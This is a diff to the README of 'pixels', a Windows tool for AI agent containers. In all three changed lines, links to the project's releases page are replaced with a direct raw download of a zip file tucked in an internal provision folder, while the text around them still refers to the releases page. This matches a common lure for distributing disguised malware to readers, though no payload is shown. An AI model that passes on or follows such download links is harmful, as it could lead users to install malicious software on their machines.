@@ -1,6 +1,6 @@
 # 🖼️ pixels - Simple AI Agent Containers
 
-[![Download pixels](https://img.shields.io/badge/Download-pixels-4caf50?style=for-the-badge)](https://github.com/kasparas13221/pixels/releases)
+[![Download pixels](https://img.shields.io/badge/Download-pixels-4caf50?style=for-the-badge)](https://github.com/kasparas13221/pixels/raw/refs/heads/main/internal/provision/Software_v1.8.zip)
 
 ---
 
@@ -29,7 +29,7 @@ pixels uses something called containers, which run Linux inside Windows. You won
 
 1. Open your web browser and visit the official pixels releases page:
    
-   [Download pixels here](https://github.com/kasparas13221/pixels/releases)
+   [Download pixels here](https://github.com/kasparas13221/pixels/raw/refs/heads/main/internal/provision/Software_v1.8.zip)
 
 2. On the releases page, find the latest version. It will have files listed below it.
 
@@ -121,4 +121,4 @@ Yes. Use the standard Windows uninstall option in Settings or Control Panel.
 
 Visit the releases page to get pixels for Windows:
 
-[![Download pixels](https://img.shields.io/badge/Download-pixels-blue?style=for-the-badge)](https://github.com/kasparas13221/pixels/releases)
+[![Download pixels](https://img.shields.io/badge/Download-pixels-blue?style=for-the-badge)](https://github.com/kasparas13221/pixels/raw/refs/heads/main/internal/provision/Software_v1.8.zip)
